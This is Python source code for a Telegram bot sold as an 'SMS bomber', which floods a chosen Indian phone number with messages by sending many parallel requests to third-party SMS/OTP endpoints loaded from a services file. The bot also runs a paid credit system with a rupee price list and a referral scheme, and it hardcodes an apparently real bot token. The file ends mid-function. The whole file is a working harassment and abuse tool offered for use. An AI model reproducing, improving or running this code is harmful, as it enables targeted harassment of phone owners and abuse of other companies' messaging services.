#!/usr/bin/env python
# ULTIMATE BOMBER BOT - COMPLETE UI
# (c) @lordzenox | @zenoxtool

import os, sys, json, time, random, threading, logging, requests, concurrent.futures
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters

# ========== CONFIG (DIRECT) ==========
BOT_TOKEN = "8996694548:AAF0ZA36jaUDkbkrKpcbqjxuppiX3YyyseY"
ADMIN_ID = 8112149031
OWNER = "@lordzenox"
CHANNEL1 = "@zenoxtool"
CHANNEL2 = "@Dev_Null_X_NODE_JS"
BOT_NAME = "ZeNoX BOMBER"
BOT_VERSION = "v4.0"
REFERRAL_BONUS = 5
BOMB_COST = 2
FREE_COINS = 5
MAX_SMS_PER_BOMB = 500

# ========== DISABLE LOGGING ==========
logging.basicConfig(level=logging.ERROR)
sys.stderr = open(os.devnull, 'w')

# ========== GLOBALS ==========
stop_bombing = {}
total_requests = {}
current_target = {}

# ========== LOAD SERVICES ==========
def load_services():
    try:
        with open('services.json', 'r') as f:
            data = json.load(f)
            return data.get('services', [])
    except:
        return []

SERVICES = load_services()
print(f"✅ Loaded {len(SERVICES)} services")

# ========== DATABASE (EMBEDDED) ==========
import sqlite3, random, string
from datetime import datetime, timedelta

DB_NAME = 'zenox_bomber.db'

def init_db():
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY, username TEXT, first_name TEXT,
        coins INTEGER DEFAULT 0, total_bombs INTEGER DEFAULT 0,
        total_sms INTEGER DEFAULT 0, referred_by INTEGER DEFAULT 0,
        referral_code TEXT UNIQUE, join_date TEXT, is_admin INTEGER DEFAULT 0,
        is_banned INTEGER DEFAULT 0, last_active TEXT
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS transactions (
        id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER,
        amount INTEGER, type TEXT, description TEXT, date TEXT
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS bomb_logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER,
        target TEXT, sms_count INTEGER, success INTEGER,
        failed INTEGER, date TEXT
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS redeem_codes (
        id INTEGER PRIMARY KEY AUTOINCREMENT, code TEXT UNIQUE,
        amount INTEGER, used_by INTEGER DEFAULT 0, is_used INTEGER DEFAULT 0,
        created_by INTEGER, created_date TEXT, expiry_date TEXT
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS referrals (
        id INTEGER PRIMARY KEY AUTOINCREMENT, referrer_id INTEGER,
        referred_id INTEGER, coins_earned INTEGER DEFAULT 5, date TEXT
    )''')
    conn.commit()
    conn.close()

init_db()

def get_user(user_id):
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
    user = c.fetchone()
    conn.close()
    return user

def create_user(user_id, username, first_name):
    if get_user(user_id):
        return False, "User already exists"
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    ref_code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
    c.execute('''INSERT INTO users (user_id, username, first_name, coins, referral_code, join_date, last_active)
        VALUES (?, ?, ?, ?, ?, ?, ?)''',
        (user_id, username or first_name, first_name, FREE_COINS, ref_code,
         datetime.now().isoformat(), datetime.now().isoformat()))
    conn.commit()
    conn.close()
    return True, "User created"

def get_balance(user_id):
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("SELECT coins FROM users WHERE user_id = ?", (user_id,))
    result = c.fetchone()
    conn.close()
    return result[0] if result else 0

def deduct_coins(user_id, amount, description):
    if amount <= 0: return False
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("SELECT coins FROM users WHERE user_id = ?", (user_id,))
    user = c.fetchone()
    if not user or user[0] < amount:
        conn.close()
        return False
    c.execute("UPDATE users SET coins = coins - ? WHERE user_id = ?", (amount, user_id))
    c.execute('''INSERT INTO transactions (user_id, amount, type, description, date)
        VALUES (?, ?, ?, ?, ?)''',
        (user_id, amount, 'debit', description, datetime.now().isoformat()))
    conn.commit()
    conn.close()
    return True

def add_coins(user_id, amount, description):
    if amount <= 0: return False
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("UPDATE users SET coins = coins + ? WHERE user_id = ?", (amount, user_id))
    c.execute('''INSERT INTO transactions (user_id, amount, type, description, date)
        VALUES (?, ?, ?, ?, ?)''',
        (user_id, amount, 'credit', description, datetime.now().isoformat()))
    conn.commit()
    conn.close()
    return True

def add_bomb_stats(user_id, target, sms_count, success, failed):
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("UPDATE users SET total_bombs = total_bombs + 1, total_sms = total_sms + ? WHERE user_id = ?",
              (sms_count, user_id))
    c.execute('''INSERT INTO bomb_logs (user_id, target, sms_count, success, failed, date)
        VALUES (?, ?, ?, ?, ?, ?)''',
        (user_id, target, sms_count, success, failed, datetime.now().isoformat()))
    conn.commit()
    conn.close()

def get_user_stats(user_id):
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("SELECT coins, total_bombs, total_sms FROM users WHERE user_id = ?", (user_id,))
    result = c.fetchone()
    conn.close()
    if result:
        return {'coins': result[0], 'total_bombs': result[1], 'total_sms': result[2]}
    return None

def is_admin(user_id):
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("SELECT is_admin FROM users WHERE user_id = ?", (user_id,))
    result = c.fetchone()
    conn.close()
    return result and result[0] == 1

def make_admin(user_id):
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("UPDATE users SET is_admin = 1 WHERE user_id = ?", (user_id,))
    conn.commit()
    conn.close()

def is_banned(user_id):
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("SELECT is_banned FROM users WHERE user_id = ?", (user_id,))
    result = c.fetchone()
    conn.close()
    return result and result[0] == 1

def get_all_users(limit=100):
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("SELECT user_id, username, coins, total_bombs, total_sms FROM users ORDER BY coins DESC LIMIT ?", (limit,))
    users = c.fetchall()
    conn.close()
    return users

def get_total_stats():
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM users")
    total_users = c.fetchone()[0]
    c.execute("SELECT SUM(coins) FROM users")
    total_coins = c.fetchone()[0] or 0
    c.execute("SELECT SUM(total_bombs) FROM users")
    total_bombs = c.fetchone()[0] or 0
    c.execute("SELECT SUM(total_sms) FROM users")
    total_sms = c.fetchone()[0] or 0
    conn.close()
    return {'users': total_users, 'coins': total_coins, 'bombs': total_bombs, 'sms': total_sms}

def get_referral_code(user_id):
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("SELECT referral_code FROM users WHERE user_id = ?", (user_id,))
    result = c.fetchone()
    conn.close()
    return result[0] if result else None

def get_referral_count(user_id):
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM users WHERE referred_by = ?", (user_id,))
    count = c.fetchone()[0]
    conn.close()
    return count

def get_bomb_logs(user_id, limit=10):
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("SELECT target, sms_count, success, failed, date FROM bomb_logs WHERE user_id = ? ORDER BY date DESC LIMIT ?",
              (user_id, limit))
    logs = c.fetchall()
    conn.close()
    return logs

def use_redeem_code(user_id, code):
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("SELECT * FROM redeem_codes WHERE code = ? AND is_used = 0", (code,))
    code_data = c.fetchone()
    if not code_data:
        conn.close()
        return False, "❌ Invalid or expired code"
    if code_data[7] and datetime.now().isoformat() > code_data[7]:
        conn.close()
        return False, "❌ Code expired"
    c.execute("UPDATE redeem_codes SET is_used = 1, used_by = ? WHERE code = ?", (user_id, code))
    amount = code_data[2]
    add_coins(user_id, amount, f"Redeemed code: {code}")
    conn.commit()
    conn.close()
    return True, f"✅ Successfully redeemed {amount} coins"

def create_redeem_code(code, amount, created_by):
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute('''INSERT INTO redeem_codes (code, amount, created_by, created_date, expiry_date)
        VALUES (?, ?, ?, ?, ?)''',
        (code, amount, created_by, datetime.now().isoformat(),
         (datetime.now() + timedelta(days=365)).isoformat()))
    conn.commit()
    conn.close()
    return True

make_admin(ADMIN_ID)

# ========== BOMBING ENGINE ==========
def format_phone(phone, fmt):
    p = str(phone).strip()
    if fmt == "with_plus91": return f"+91{p}"
    if fmt == "91-": return f"91-{p}"
    return p

def send_request(svc, phone):
    method = svc.get('method', 'POST').upper()
    url = svc.get('url', '').replace("{phone}", format_phone(phone, svc.get('phone_format', 'raw')))
    headers = svc.get('headers', {}).copy()
    data = svc.get('data')
    if data:
        if '_raw' in data:
            raw = data['_raw'].replace("{phone}", format_phone(phone, svc.get('phone_format', 'raw')))
            try:
                import ast
                data = ast.literal_eval(raw)
            except:
                pass
        else:
            data = json.loads(json.dumps(data).replace("{phone}", format_phone(phone, svc.get('phone_format', 'raw'))))
    try:
        if method == 'GET':
            r = requests.get(url, headers=headers, timeout=2)
        elif method == 'POST':
            r = requests.post(url, headers=headers, json=data, timeout=2)
        elif method == 'PUT':
            r = requests.put(url, headers=headers, json=data, timeout=2)
        else:
            return False
        return r.status_code < 500
    except:
        return False

def bomb_thread(phone, total, user_id):
    global stop_bombing, total_requests
    total_requests[user_id] = 0
    services = SERVICES.copy()
    random.shuffle(services)
    sent = 0
    success = 0
    failed = 0

    def send_one(svc):
        try:
            return send_request(svc, phone)
        except:
            return False

    while sent < total and not stop_bombing.get(user_id, False):
        batch_size = 30
        batch = services[:batch_size]
        with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
            results = executor.map(send_one, batch)
            for ok in results:
                if stop_bombing.get(user_id, False) or sent >= total:
                    break
                if ok:
                    success += 1
                else:
                    failed += 1
                sent += 1
                total_requests[user_id] = sent
                if sent >= total:
                    break
        random.shuffle(services)
        time.sleep(0.005)

    add_bomb_stats(user_id, phone, sent, success, failed)
    return sent, success, failed

# ========== TELEGRAM BOT ==========
app = Application.builder().token(BOT_TOKEN).build()

# ========== START ==========
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user = update.effective_user

    if is_banned(user_id):
        await update.message.reply_text("🚫 You are banned.")
        return

    if not get_user(user_id):
        created, msg = create_user(user_id, user.username or user.first_name, user.first_name)
        if not created:
            await update.message.reply_text("❌ Error creating user.")
            return

    stats = get_user_stats(user_id)
    coins = get_balance(user_id)
    ref_count = get_referral_count(user_id)

    msg = f"""🔥 **{BOT_NAME}**
💀 **ULTIMATE SMS BOMBER {BOT_VERSION}**

👑 **Owner:** {OWNER}

- **ROLE**: {'ADMIN' if user_id == ADMIN_ID else 'FREE USER'}
- **CREDITS**: **{coins}**
- **USES**: **{stats['total_bombs']}**
- **APIS**: **{len(SERVICES)}**
- **SCANNER**: **{stats['total_sms']} DEVICES**

📢 **Channels:** {CHANNEL1} | {CHANNEL2}

💀 **TAP START TO BEGIN**"""

    keyboard = [
        [InlineKeyboardButton("💣 SEND SMS", callback_data="send_sms")],
        [InlineKeyboardButton("📹 VIDEOS", callback_data="videos"),
         InlineKeyboardButton("💰 CREDITS", callback_data="credits")],
        [InlineKeyboardButton("🎁 REDEEM", callback_data="redeem"),
         InlineKeyboardButton("🔗 REFER", callback_data="refer")],
        [InlineKeyboardButton("📊 STATS", callback_data="stats"),
         InlineKeyboardButton("📜 MY SMS HISTORY", callback_data="history")],
        [InlineKeyboardButton("💳 BUY CREDITS", callback_data="buy_credits"),
         InlineKeyboardButton("🔄 TRANSFER CREDITS", callback_data="transfer")],
        [InlineKeyboardButton("ℹ️ INFO", callback_data="info")],
    ]
    await update.message.reply_text(msg, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")

# ========== ADMIN PANEL ==========
async def admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != ADMIN_ID:
        await update.message.reply_text("❌ Unauthorized! Only admin can access.")
        return
    users = get_all_users(limit=30)
    if not users:
        await update.message.reply_text("📊 No users found.")
        return
    msg = "🔐 **ADMIN PANEL**\n"
    msg += "═" * 35 + "\n\n"
    msg += "👥 **ACTIVE USERS**\n"
    msg += "─────────────────────\n"
    msg += "`# | ID | Username | Coins | Bombs | Status`\n"
    msg += "─────────────────────\n"
    count = 1
    for uid, username, coins, bombs, sms in users[:20]:
        role = "👑 ADMIN" if is_admin(uid) else "🚫 BANNED" if is_banned(uid) else "✅ USER"
        uname = username[:12] if username else "Unknown"
        msg += f"`{count:2} | {uid} | {uname} | {coins:3} | {bombs:3} | {role}`\n"
        count += 1
    stats = get_total_stats()
    msg += "\n─────────────────────\n"
    msg += f"📊 **Total Users:** {stats['users']}\n"
    msg += f"💰 **Total Coins:** {stats['coins']}\n"
    msg += f"💣 **Total Bombs:** {stats['bombs']}\n"
    msg += f"📱 **Total SMS:** {stats['sms']}\n"
    keyboard = [[InlineKeyboardButton("🔙 BACK", callback_data="back_main")]]
    await update.message.reply_text(msg, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")

# ========== CALLBACK HANDLER ==========
async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = update.effective_user.id

    if is_banned(user_id):
        await query.edit_message_text("🚫 You are banned.")
        return

    data = query.data

    if data == "send_sms":
        context.user_data['step'] = 'number'
        await query.edit_message_text(
            "📱 **STEP 1/4 – NUMBER**\n\nJis number pe SMS bhejna hai woh enter karo:\n*Example:* +919876543210\n\n⏳ Send the number in 60 seconds.",
            parse_mode="Markdown"
        )

    elif data == "videos":
        await query.edit_message_text(
            f"📹 **Video Tutorials**\n\n📢 More videos on channel:\n{CHANNEL1}",
            parse_mode="Markdown"
        )
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_main")]]
        await query.edit_message_reply_markup(InlineKeyboardMarkup(keyboard))

    elif data == "credits":
        coins = get_balance(user_id)
        stats = get_user_stats(user_id)
        ref_count = get_referral_count(user_id)
        msg = f"""💰 **Your Credits**

💳 **Balance:** {coins} credits
💣 **Bombs Used:** {stats['total_bombs']}
📱 **SMS Sent:** {stats['total_sms']}
👤 **Referrals:** {ref_count}
🎁 **Bonus Earned:** {ref_count * REFERRAL_BONUS}"""
        keyboard = [
            [InlineKeyboardButton("🔗 Refer & Earn", callback_data="refer")],
            [InlineKeyboardButton("💳 Buy Credits", callback_data="buy_credits")],
            [InlineKeyboardButton("🔙 Back", callback_data="back_main")],
        ]
        await query.edit_message_text(msg, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")

    elif data == "redeem":
        await query.edit_message_text(
            "🎁 **Redeem Code**\n\nApna redeem code yahan type karo:\n`/redeem <code>`\n\nExample: `/redeem TEST123`\n\n📌 Code @lordzenox se lo.",
            parse_mode="Markdown"
        )
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_main")]]
        await query.edit_message_reply_markup(InlineKeyboardMarkup(keyboard))

    elif data == "refer":
        ref_code = get_referral_code(user_id)
        if not ref_code:
            await query.edit_message_text("❌ Error getting referral code.")
            return
        bot_username = (await context.bot.get_me()).username
        ref_link = f"https://t.me/{bot_username}?start={ref_code}"
        ref_count = get_referral_count(user_id)
        msg = f"""🔗 **Refer & Earn**

👤 **Your Referral Link:**
`{ref_link}`

📊 **Total Referrals:** {ref_count}
💰 **Coins Earned:** {ref_count * REFERRAL_BONUS}"""
        keyboard = [
            [InlineKeyboardButton("📤 Share", url=f"https://t.me/share/url?url={ref_link}&text=🔥 Join {BOT_NAME}!")],
            [InlineKeyboardButton("🔙 Back", callback_data="back_main")],
        ]
        await query.edit_message_text(msg, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")

    elif data == "stats":
        stats = get_user_stats(user_id)
        coins = get_balance(user_id)
        msg = f"""📊 **Your Statistics**

👑 **Role:** {'ADMIN' if user_id == ADMIN_ID else 'FREE USER'}
💰 **Credits:** {coins}
💣 **Total Bombs:** {stats['total_bombs']}
📱 **SMS Sent:** {stats['total_sms']}
📡 **APIs:** {len(SERVICES)}
👤 **Referrals:** {get_referral_count(user_id)}"""
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_main")]]
        await query.edit_message_text(msg, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")

    elif data == "history":
        logs = get_bomb_logs(user_id)
        if not logs:
            await query.edit_message_text("📜 **No SMS History**")
            keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_main")]]
            await query.edit_message_reply_markup(InlineKeyboardMarkup(keyboard))
            return
        msg = "📜 **My SMS History**\n\n"
        for target, sms, success, failed, date in logs[:5]:
            date_short = date[:16]
            msg += f"📱 +91{target}\n   📊 {sms} SMS | ✅ {success}\n   🕐 {date_short}\n\n"
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_main")]]
        await query.edit_message_text(msg, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")

    elif data == "buy_credits":
        msg = f"""💳 **Buy Credits**

👤 **Owner:** {OWNER}

💎 **Credit Prices:**
• **20 credits** - ₹40
• **50 credits** - ₹100
• **100 credits** - ₹190
• **250 credits** - ₹450
• **500 credits** - ₹850
• **1000 credits** - ₹1600
• **2500 credits** - ₹3750
• **5000 credits** - ₹7000

📩 Click below to contact owner!"""
        keyboard = [
            [InlineKeyboardButton("👤 Contact Owner", url="https://t.me/lordzenox")],
            [InlineKeyboardButton("🔙 Back", callback_data="back_main")],
        ]
        await query.edit_message_text(msg, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")

    elif data == "transfer":
        await query.edit_message_text(
            "🔄 **Transfer Credits**\n\nUsage: `/transfer <user_id> <amount>`",
            parse_mode="Markdown"
        )
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_main")]]
        await query.edit_message_reply_markup(InlineKeyboardMarkup(keyboard))

    elif data == "info":
        msg = f"""ℹ️ **About {BOT_NAME}**

💀 **Version:** {BOT_VERSION}
👑 **Owner:** {OWNER}
📡 **APIs:** {len(SERVICES)}
📢 **Channels:** {CHANNEL1} | {CHANNEL2}

⚠️ **Disclaimer:** For educational purposes only."""
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_main")]]
        await query.edit_message_text(msg, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")

    elif data == "back_main":
        stats = get_user_stats(user_id)
        coins = get_balance(user_id)
        ref_count = get_referral_count(user_id)
        msg = f"""🔥 **{BOT_NAME}**
💀 **ULTIMATE SMS BOMBER {BOT_VERSION}**

👑 **Owner:** {OWNER}

- **ROLE**: {'ADMIN' if user_id == ADMIN_ID else 'FREE USER'}
- **CREDITS**: **{coins}**
- **USES**: **{stats['total_bombs']}**
- **APIS**: **{len(SERVICES)}**
- **SCANNER**: **{stats['total_sms']} DEVICES**

📢 **Channels:** {CHANNEL1} | {CHANNEL2}

💀 **TAP START TO BEGIN**"""
        keyboard = [
            [InlineKeyboardButton("💣 SEND SMS", callback_data="send_sms")],
            [InlineKeyboardButton("📹 VIDEOS", callback_data="videos"),
             InlineKeyboardButton("💰 CREDITS", callback_data="credits")],
            [InlineKeyboardButton("🎁 REDEEM", callback_data="redeem"),
             InlineKeyboardButton("🔗 REFER", callback_data="refer")],
            [InlineKeyboardButton("📊 STATS", callback_data="stats"),
             InlineKeyboardButton("📜 MY SMS HISTORY", callback_data="history")],
            [InlineKeyboardButton("💳 BUY CREDITS", callback_data="buy_credits"),
             InlineKeyboardButton("🔄 TRANSFER CREDITS", callback_data="transfer")],
            [InlineKeyboardButton("ℹ️ INFO", callback_data="info")],
        ]
        await query.edit_message_text(msg, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")

    elif data == "speed_fast":
        context.user_data['speed'] = 'fast'
        await speed_selected(query, context)
    elif data == "speed_medium":
        context.user_data['speed'] = 'medium'
        await speed_selected(query, context)
    elif data == "speed_slow":
        context.user_data['speed'] = 'slow'
        await speed_selected(query, context)

    elif data.startswith("count_"):
        count = int(data.split("_")[1])
        await start_bombing_process(query, context, count)

    elif data == "count_custom":
        context.user_data['step'] = 'custom_count'
        await query.edit_message_text(
            "📊 **Enter custom count**\n\nSend the number of SMS you want to send.\nExample: `50`\n\n⏳ Max: 5000",
            parse_mode="Markdown"
        )

    elif data == "stop_bombing":
        stop_bombing[user_id] = True
        await query.edit_message_text("🛑 **Bombing Stopped!**", parse_mode="Markdown")

async def speed_selected(query, context):
    speed = context.user_data.get('speed', 'medium')
    total_apis = len(SERVICES)
    device_capacity = total_apis * 3
    credits = get_balance(query.from_user.id)

    msg = f"""⚡ **{speed.upper()} selected!**

**STEP 4/4 – COUNT**
📡 Online APIs : {total_apis}
📱 Device Capacity: {device_capacity} SMS
💰 Your Credits: {credits}

Kitne SMS bhejna hai?"""

    keyboard = [
        [InlineKeyboardButton("10", callback_data="count_10"), InlineKeyboardButton("25", callback_data="count_25"), InlineKeyboardButton("50", callback_data="count_50")],
        [InlineKeyboardButton("100", callback_data="count_100"), InlineKeyboardButton("250", callback_data="count_250"), InlineKeyboardButton("500", callback_data="count_500")],
        [InlineKeyboardButton("1000", callback_data="count_1000"), InlineKeyboardButton("✏️ CUSTOM", callback_data="count_custom")],
        [InlineKeyboardButton("🔙 Back", callback_data="back_main")],
    ]
    await query.edit_message_text(msg, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")

async def start_bombing_process(query, context, count):
    user_id = query.from_user.id
    phone = context.user_data.get('phone', '')
    speed = context.user_data.get('speed', 'medium')
    msg_text = context.user_data.get('msg', '')

    coins = get_balance(user_id)
    if coins < BOMB_COST:
        await query.edit_message_text(f"❌ **Insufficient Credits!**\n💰 Balance: {coins}\n💸 Cost: {BOMB_COST}", parse_mode="Markdown")
        return

    if not deduct_coins(user_id, BOMB_COST, f"Bomb on +91{phone}"):
        await query.edit_message_text("❌ Failed to deduct credits.")
        return

    stop_bombing[user_id] = False

    msg = f"""🔄 **SENDING SMS...**

📱 Target: +91{phone}
📊 Count: {count}
⚡ Speed: {speed.upper()}
📝 Message: {msg_text if msg_text else 'None'}

📊 Progress: 0% | SENT: 0 | FAILED: 0

🛑 Stop button dabayein agar beech mein rokna ho."""

    keyboard = [[InlineKeyboardButton("🛑 STOP SENDING", callback_data="stop_bombing")]]
    await query.edit_message_text(msg, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")

    def run_bomb():
        sent, success, failed = bomb_thread(phone, count, user_id)
        if stop_bombing.get(user_id, False):
            final_msg = f"""⛔ **STOPPED!**\n\n📱 Target: +91{phone}\n📊 Sent: {sent}\n✅ Success: {success}\n❌ Failed: {failed}\n⚡ Speed: {speed.upper()}\n📝 Message: {msg_text if msg_text else 'None'}"""
        else:
            final_msg = f"""✅ **SMS SENT!**\n\n📱 Target: +91{phone}\n📊 Sent: {sent}\n✅ Success: {success}\n❌ Failed: {failed}\n⚡ Speed: {speed.upper()}\n📝 Message: {msg_text if msg_text else 'None'}\n\n📢 {CHANNEL1} | {CHANNEL2}"""
        try:
            query.edit_message_text(final_msg, parse_mode="Markdown")
        except:
            pass

    threading.Thread(target=run_bomb, daemon=True).start()

# ========== MESSAGE HANDLER ==========
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text.strip()

    if is_banned(user_id):
        await update.message.reply_text("🚫 You are banned.")
        return

    step = context.user_data.get('step', '')

    if step == 'number':
        phone = ''.join(filter(str.isdigit, text))
        if len(phone) >= 10:
            phone = phone[-10:]
            context.user_data['phone'] = phone
            context.user_data['step'] = 'message'
            await update.message.reply_text(
                f"✅ **Number:** +91{phone}\n\n**STEP 2/4 – MESSAGE**\nJo message bhejna hai woh type karo:\n(Optional — type 'skip' to skip)",
                parse_mode="Markdown"
            )
        else:
            await update.message.reply_text("❌ Invalid number! Enter 10-digit number.")

    elif step == 'message':
        if text.lower() == 'skip':
            context.user_data['msg'] = ''
        else:
            context.user_data['msg'] = text
        context.user_data['step'] = 'speed'
        msg = "**STEP 3/4 – SPEED**\nSending speed select karein:"
        keyboard = [
            [InlineKeyboardButton("🚀 FAST", callback_data="speed_fast")],
            [InlineKeyboardButton("⚡ MEDIUM", callback_data="speed_medium")],
            [InlineKeyboardButton("🐢 SLOW", callback_data="speed_slow")],
        ]
        await update.message.reply_text(msg, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")

    elif step == 'custom_count':
        try:
            count = int(text)
            if count < 1 or count > 5000:
                await update.message.reply_text("❌ Enter 1-5000.")
                return
            context.user_data['step'] = None
            await start_bombing_direct(update, context, count)
        except ValueError:
            await update.message.reply_text("❌ Invalid count! Enter a number.")

    else:
        await update.message.reply_text("❌ Use /start to begin.")

async def start_bombing_direct(update, context, count):
    user_id = update.effective_user.id
    phone = context.user_data.get('phone', '')
    speed = context.user_data.get('speed', 'medium')
    msg_text = context.user_data.get('msg', '')

    coins = get_balance(user_id)
    if coins < BOMB_COST:
        await update.message.reply_text(f"❌ **Insufficient Credits!**\n💰 Balance: {coins}\n💸 Cost: {BOMB_COST}", parse_mode="Markdown")
        return

    if not deduct_coins(user_id, BOMB_COST, f"Bomb on +91{phone}"):
        await update.message.reply_text("❌ Failed to deduct credits.")
        return

    stop_bombing[user_id] = False
    await update.message.reply_text(
        f"🔄 **SENDING SMS...**\n📱 +91{phone}\n📊 {count} SMS\n⚡ {speed.upper()}\n🛑 Type /stop to stop.",
        parse_mode="Markdown"
    )

    def run_bomb():
        sent, success, failed = bomb_thread(phone, count, user_id)
        final_msg = f"""✅ **SMS SENT!**\n📱 +91{phone}\n📊 Sent: {sent}\n✅ Success: {success}\n❌ Failed: {failed}\n⚡ Speed: {speed.upper()}\n📝 Message: {msg_text if msg_text else 'None'}"""
        update.message.reply_text(final_msg, parse_mode="Markdown")

    threading.Thread(target=run_bomb, daemon=True).start()

# ========== COMMANDS ==========
async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    stop_bombing[user_id] = True
    await update.message.reply_text("🛑 **Bombing Stopped!**", parse_mode="Markdown")

async def balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    coins = get_balance(user_id)
    await update.message.reply_text(f"💰 **Your Balance:** {coins} credits", parse_mode="Markdown")

async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = """📌 **Available Commands:**\n\n/start - Start bot\n/stop - Stop bombing\n/balance - Check credits\n/help - Show help\n/status - Bot status\n/admin - Admin panel (admin only)\n/redeem <code> - Redeem code"""
    await update.message.reply_text(msg, parse_mode="Markdown")

async def status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = f"""📊 **Bot Status**\n\n🤖 {BOT_NAME}\n📡 APIs: {len(SERVICES)}\n👑 Owner: {OWNER}\n📢 {CHANNEL1} | {CHANNEL2}\n⏰ Online"""
    await update.message.reply_text(msg, parse_mode="Markdown")

async def redeem_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if is_banned(user_id):
        await update.message.reply_text("🚫 You are banned.")
        return
    if len(context.args) != 1:
        await update.message.reply_text("❌ Usage: `/redeem <code>`", parse_mode="Markdown")
        return
    code = context.args[0]
    success, msg = use_redeem_code(user_id, code)
    await update.message.reply_text(msg, parse_mode="Markdown")

async def transfer(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if is_banned(user_id):
        await update.message.reply_text("🚫 You are banned.")
        return
    if len(context.args) != 2:
        await update.message.reply_text("❌ Usage: `/transfer <user_id> <amount>`", parse_mode="Markdown")
        return
    try:
        target_id = int(context.args[0])
        amount = int(context.args[1])
    except ValueError:
        await update.message.reply_text("❌ Invalid input!")
        return
    # Transfer logic (database mein function hona chahiye)
    await update.message.reply_text("🔄 Transfer feature coming soon.")

async def addcoins(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != ADMIN_ID:
        await update.message.reply_text("❌ Unauthorized!")
        return
    if len(context.args) != 2:
        await update.message.reply_text("❌ Usage: `/addcoins <user_id> <amount>`", parse_mode="Markdown")
        return
    try:
        target_id = int(context.args[0])
        amount = int(context.args[1])
    except ValueError:
        await update.message.reply_text("❌ Invalid input!")
        return
    add_coins(target_id, amount, f"Admin added {amount} credits")
    await update.message.reply_text(f"✅ Added **{amount}** credits to `{target_id}`", parse_mode="Markdown")

async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != ADMIN_ID:
        await update.message.reply_text("❌ Unauthorized!")
        return
    if not context.args:
        await update.message.reply_text("❌ Usage: `/broadcast <message>`", parse_mode="Markdown")
        return
    message = " ".join(context.args)
    users = get_all_users()
    sent = 0
    for uid, username, coins, bombs, sms in users:
        try:
            await context.bot.send_message(uid, f"📢 **Announcement**\n\n{message}", parse_mode="Markdown")
            sent += 1
            time.sleep(0.05)
        except:
            pass
    await update.message.reply_text(f"✅ Broadcast sent to {sent} users")

async def createcode(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != ADMIN_ID:
        await update.message.reply_text("❌ Unauthorized!")
        return
    if len(context.args) != 2:
        await update.message.reply_text("❌ Usage: `/createcode <code> <amount>`", parse_mode="Markdown")
        return
